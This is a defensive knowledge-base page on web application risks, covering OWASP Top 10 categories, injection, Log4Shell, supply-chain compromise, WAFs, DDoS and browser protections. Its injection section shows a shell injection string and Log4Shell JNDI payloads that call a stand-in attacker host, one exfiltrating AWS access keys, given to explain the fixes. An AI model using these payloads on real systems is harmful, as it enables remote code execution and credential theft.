---
title: "Web Application Risks"
summary: "What goes wrong in web applications, how the main OWASP risks work, and which layer of defence slows each attack."
kind: concept
status: current
last_reviewed: 2026-09-16
sources:
  - "OWASP Top 10:2021 and OWASP Top 10:2025"
  - "OWASP Application Security Verification Standard"
  - "DevOpsSec, ch. 4, From gates to guardrails; Netflix talk on the same shift"
  - "Java Brains, Log4j vulnerability explained"
  - "Cloudflare, NTP amplification DDoS attack"
  - "OWASP ModSecurity, OWASP Core Rule Set and OWASP Coraza"
tags: [owasp, injection, web-security, waf, ddos, defence-in-depth]
---
# Web Application Risks

What goes wrong in web applications, how does each attack work, and what stops it? An application is a gateway to servers, networks and data, so it is the attack path of choice. Securing it is not a single pronged approach. **Defence in depth** puts several layers in the way so that an attack loses momentum at each one and you gain time to respond. It is often compared to a castle with multiple walls. The aim is to raise the cost and effort of an attack, not to make one impossible.

## Security requirements

We have well defined tools for gathering functional requirements: user stories, acceptance criteria, definition of done within a BDD approach. Teams are far less mature at gathering non functional requirements, and security requirements in particular. Some reasons:

* Deep technical knowledge may be required.
* There is not always a security expert on the team.
* Stakeholders may not see the security cost to revenue and are unwilling to invest time and resource.

You can never be 100% secure, so it is worth deciding what good looks like:

* How urgently do you fix a vulnerability found in production?
* Do you understand the risk of running with known vulnerabilities?
* What is the organisation's appetite for risk, and what kind of data do you hold? Finance, healthcare and a provider of public traffic data have different answers.
* Is some downtime acceptable?

### Gates to guardrails

The traditional secure development lifecycle is a series of assessments (design review, threat model, vulnerability scan), each a gate that decides whether work proceeds. Teams doing agile, cloud and continuous delivery want something more automated. Tension between SecOps, DevOps and developers leads to disjointed teams and inconsistent policy across architectures.

Moving [from gates to guardrails](https://www.oreilly.com/library/view/devopssec/9781491971413/ch04.html) means giving development teams guidance and tooling to put security policy into their own delivery pipelines instead of waiting at a compliance gate. Netflix has [described this shift](https://www.youtube.com/watch?v=geumLjxtc54), from continuous assessment to regulatory compliance to team staffing.

Data between the end user and your application flows through the data plane. Treat security as a horizontal capability across that plane, and use its metrics and telemetry to see which policies are applied and what threats arrive.

## Security theatre

Security theatre is spending on countermeasures that give the feeling of improved security while doing little or nothing to achieve it. Be aware of [security theatre](https://security.stackexchange.com/questions/112037/how-to-avoid-reveal-password-in-a-form).

## Finding the weaknesses

Security testing has two modes. Assessment finds vulnerabilities without exploiting them. Testing finds them and tries to exploit them. The [OWASP Application Security Verification Standard](https://owasp.org/projects/asvs) is the open standard for what to verify. Known vulnerabilities in the software you depend on are catalogued in the [National Vulnerability Database](https://nvd.nist.gov/) and [CVE](https://www.cve.org/).

The tools fall into four categories. Static analysis (SAST) reads source code without running it. It is good at well known patterns such as SQL injection and buffer overflows, produces many false positives, and is weak on authentication, access control and misuse of cryptography; CodeQL is one example. Dynamic analysis (DAST) tests the running application from outside by sending requests and inspecting responses, with no access to source; OWASP ZAP is one example, and it can run headless in CI. Interactive analysis (IAST) puts an agent inside the running application so it can point at the exact line a dynamic test triggers, at the cost of setup complexity. Software composition analysis (SCA) ignores your code and checks your third party dependencies against the vulnerability databases; OWASP Dependency-Check is one example. Penetration testing is a person attacking the system, usually out of band; Burp Suite is the common toolkit. It has fewer false positives than the automated categories but takes longer. Fuzzing feeds random or malformed input to find crashes and complements all of the above.

## Selected risks from the OWASP Top 10

The [OWASP Top 10](https://owasp.org/Top10/) lists the ten most critical web application risks. The 2021 list is: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable and Outdated Components, Identification and Authentication Failures, Software and Data Integrity Failures, Security Logging and Monitoring Failures, and Server-Side Request Forgery. The risks below are the ones worth understanding in detail.

Three changes in the 2025 edition matter here. Software Supply Chain Failures is added, widening Vulnerable and Outdated Components to the whole build path. Mishandling of Exceptional Conditions is added, covering errors that fail open or leak information. Server-Side Request Forgery is folded into Broken Access Control.

### Broken access control

The application checks who you are but not what you are allowed to touch. Change an id in the URL, call an admin endpoint directly, or replay another user's request, and the server obliges. The result is disclosure, modification or destruction of any data the application can reach. The fix is to enforce authorisation on the server for every request, deny by default, and never rely on the client to hide what it should not use.

### Identification and authentication failures

These are exploited with credential stuffing, brute force and weak or well known passwords. Authentication can be offloaded to an external identity provider that has credential protection built in. APIs authenticate callers with certificate based mutual TLS, HTTP Basic, API keys (a shared secret) or JSON Web Tokens; IP address allow lists are hard to manage and [not as secure as they look](https://joelgsamuel.medium.com/ip-address-access-control-lists-are-not-as-great-as-you-think-they-are-4176b7d68f20).

### Injection

Untrusted data reaches an interpreter (SQL, a shell, HTML, a log lookup) without being separated from the code the interpreter expects. If any part of a string the user controls can end up as code, there is a problem.

Use **context aware escaping**: make sure user input is treated as literal text and not as something executable, in the way that the receiving context requires. Escaping data for SQL is very different from escaping it for HTML. [Cross Site Scripting](Cross%20Site%20Scripting.md) is injection into HTML and has its own page.

Better than escaping is to keep data and code on separate channels so nothing needs escaping. Parameterised SQL does that for databases. For shell commands, pass a list of arguments so the shell is never involved:

```python
import os
import subprocess

cmd = 'echo'
user_input = 'hello world && ls -al'

# The string is handed to a shell, which sees '&&' as an operator.
# 'ls -al' runs: information disclosure. 'rm -rf' would be data destruction.
os.system(f"{cmd} {user_input}")
# hello world
# total 84
# drwxr-xr-x 9 azureuser azureuser  4096 Oct 11 12:00 .
# drwxr-xr-x 3 root      root       4096 Oct  6 12:57 ..

# The list form calls the program directly. No shell runs, so no
# escaping is needed; '&&' is just characters in one argument.
subprocess.run([cmd, user_input])
# hello world && ls -al
```

Injection can end in **remote code execution (RCE)**. Log injection on its own is a nuisance. The [Log4Shell](https://www.youtube.com/watch?v=uyq8yxWO1ls) vulnerability in Log4j turned it into RCE because the logger performed lookups inside the message it was asked to log. A `${jndi:...}` lookup made the logger fetch and run an object from a server the attacker controls.

```java
final Logger logger = LogManager.getLogger(...);

// Search page log
logger.info("User {} searched for {}", user.getId(), searchTextInput);

// If the attacker runs a JNDI server and passes this as the search text,
// the application fetches and runs the attacker's object.
searchTextInput = "${jndi:ldap://evil.example/maliciousobject}";

// Nested lookups exfiltrate environment variables in the request itself.
searchTextInput = "${jndi:ldap://evil.example:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}";
```

Later Log4j 2 releases removed message lookups and disabled JNDI by default. The lesson generalises: a library that interprets the data you give it is an interpreter, and needs the same care as SQL.

### Vulnerable components and the supply chain

Most of the code you ship is code you did not write. Log4Shell was a vulnerable dependency that many teams did not know they were running; the fix started with an inventory. SolarWinds was worse: attackers tampered with the vendor's build system so that a correctly signed update of the Orion network management product carried a backdoor. About 18,000 customers downloaded the trojanised update, and roughly 100 were then actively targeted. Signing did not help because the signature was genuine. Provenance, build integrity and SBOMs are covered in [Supply Chain and Container Security](Supply%20Chain%20and%20Container%20Security.md).

## Layer 7 protection

A Web Application Firewall (WAF) inspects HTTP requests and blocks those matching known attack patterns: SQL injection, cross site scripting, local and remote file inclusion, remote code execution. Together these make up most application layer attacks. A WAF is a layer, not a fix: it buys time while the vulnerability behind it is repaired, and it can be bypassed by an attacker who varies the payload.

ModSecurity is the reference open source WAF. It matches requests against a rule set, and the free OWASP Core Rule Set (CRS) gives generic attack detection. Trustwave, its long time maintainer, ended support in 2024 and the project moved under OWASP; the commercial Trustwave rules are gone. F5's NGINX ModSecurity WAF product is end of life, though the community connector for nginx remains. OWASP Coraza is the Go rewrite, compatible with CRS, and is what Caddy, Envoy and some Kubernetes ingress controllers now embed.

## DDoS protection

A denial of service attack floods a service until real users cannot get through. At layer 7 that is a flood of GET or POST requests. Lower layers have their own:

* SYN flood. A TCP connection needs a three way handshake: client sends SYN, server replies SYN-ACK, client sends ACK. The attacker sends SYN packets and never sends the ACK, so the server holds half open connections until it runs out.
* [NTP amplification](https://www.cloudflare.com/en-gb/learning/ddos/ntp-amplification-ddos-attack). The NTP `monlist` command returns the last 600 addresses that talked to the server. An attacker sends a small spoofed `monlist` request with the victim's address as the source; the server sends a reply hundreds of times larger to the victim. `monlist` has since been disabled on most servers, and the same trick now uses open DNS resolvers, Memcached and other reflectors.

The layers stack in one direction: DDoS filtering sits in front of the WAF, which sits in front of the application. Cloud providers offer the first layer as a service, because absorbing volumetric traffic needs more bandwidth than one application has.

## What the browser protects and what it does not

The browser does some of the work for you:

* It keeps a list of known phishing sites and warns before visiting one.
* It checks the TLS certificate and refuses weak cryptography or a broken TLS implementation.
* It handles mixed content, a page served over HTTPS that loads a resource over HTTP. Chrome upgrades such requests to HTTPS and blocks those that cannot be upgraded. Chrome removed the padlock icon in 2023; HTTPS is treated as the default and only its absence is flagged.
* It enforces the [same origin policy](Browser%20Security%20Model.md) and honours [Security Headers](Security%20Headers.md) the server sends. [MDN HTTP Observatory](https://developer.mozilla.org/en-US/observatory) and [securityheaders.com](https://securityheaders.com/) will scan a site and grade its headers.

The browser cannot protect against:

* Parameter tampering: the attacker edits cookies, form fields, headers or query strings, for example changing an id.
* Stored cross site scripting, where the payload already sits in your database.
* Direct HTTP requests that never pass through your UI, reaching an unauthorised resource or deleting one.
* [Cross Site Request Forgery](Cross%20Site%20Request%20Forgery.md), where the browser sends a legitimate user's cookies with a request the attacker composed.

Each of these only works if there is a vulnerability behind it: an API without authorisation checks, an injection point, or stolen credentials. The browser is one wall of the castle. The server has to check everything itself.

## How to rederive this

* Ask where user controlled data meets an interpreter (SQL, shell, HTML, a logger that does lookups). Each meeting point is an injection risk; separate data from code there.
* Ask what the server checks after it knows who you are. If the answer is nothing, access control is broken.
* Assume every request can be forged by a client you did not write. Anything the browser enforces, the server must enforce again.
* Each defence layer (DDoS filter, WAF, browser, server checks) slows an attack; none stops one on its own.
* Code you did not write is still your attack surface, and a valid signature only proves who built it, not that the build was clean.

## Sources

* [OWASP Top 10:2021](https://owasp.org/Top10/2021/) and [OWASP Top 10:2025](https://owasp.org/Top10/2025/)
* [OWASP Application Security Verification Standard](https://owasp.org/projects/asvs)
* DevOpsSec, ch. 4, [From gates to guardrails](https://www.oreilly.com/library/view/devopssec/9781491971413/ch04.html), and Netflix's talk on [the same shift](https://www.youtube.com/watch?v=geumLjxtc54)
* Java Brains, [Log4j vulnerability explained](https://www.youtube.com/watch?v=uyq8yxWO1ls)
* Cloudflare, [NTP amplification DDoS attack](https://www.cloudflare.com/en-gb/learning/ddos/ntp-amplification-ddos-attack)
* [OWASP ModSecurity](https://owasp.org/projects/modsecurity), [OWASP Core Rule Set](https://coreruleset.org/) and [OWASP Coraza](https://coraza.io/)
* Practice targets: [OWASP Juice Shop](https://owasp.org/projects/juice-shop), [Google firing range](https://github.com/google/firing-range), Troy Hunt's [Hack yourself first](https://www.troyhunt.com/hack-yourself-first-how-to-go-on/), and [Open Bug Bounty](https://www.openbugbounty.org) for responsible disclosure against live sites
